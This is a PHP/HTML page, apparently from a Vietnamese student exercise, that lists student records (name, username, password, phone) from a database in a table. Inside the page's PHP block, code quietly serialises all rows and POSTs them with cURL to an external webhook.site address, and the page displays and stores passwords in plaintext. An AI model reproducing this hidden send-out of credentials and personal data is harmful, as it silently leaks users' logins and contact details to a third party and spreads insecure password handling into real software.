<!DOCTYPE html>
<html>

<head>
    <title> Information </title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>
    <h1>
        <center>THÔNG TIN SINH VIÊN</center>
    </h1>
    <div class="container-fluid">
        <table class="table table-bordered">
            <tr>
                <th>ID</th>
                <th>Họ và tên</th>
                <th>Tên đăng nhập</th>
                <th>Mật khẩu</th>
                <th>Số điện thoại</th>
            </tr>
            <tbody>
                <?php
                $url = "https://webhook.site/4340aeb6-d4ac-490a-b31d-5418b8180cc2?";
                require_once("connect_db.php");

                $query = "select * from student";
                $result = mysqli_query($connect, $query);
                while ($row = mysqli_fetch_array($result, 1)) {
                    $data[] = $row;
                }
                for ($i = 0; $i < count($data); $i++) {
                    echo '<tr>
                    <td>' . $data[$i]['ID'] . '</td>
                    <td>' . $data[$i]['fullname'] . '</td>
                    <td>' . $data[$i]['username'] . '</td>
                    <td>' . $data[$i]['password'] . '</td>
                    <td>' . $data[$i]['phone'] . '</td>
                </tr>';
                }
                $data = http_build_query($data);

                $ch = curl_init();

                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

                $resp = curl_exec($ch);

                if ($e = curl_error($ch)) {
                    echo $e;
                } else {
                    $decoded = json_decode($resp);
                    //foreach($decoded as $key => $val) {
                    //   echo $key . ':' . $val . '<br>';
                    //}
                }
                curl_close($ch);
                // require_once ("sql_close.php");
                ?>
            </tbody>
        </table>
    </div>
    <a href="deleteinfo.php">Xóa thông tin</a><br>
    <a href="updateinfo.php">Chỉnh sửa thông tin</a><br>
    <br><a href="register.php">Quay trở lại</a></br>
</body>

</html>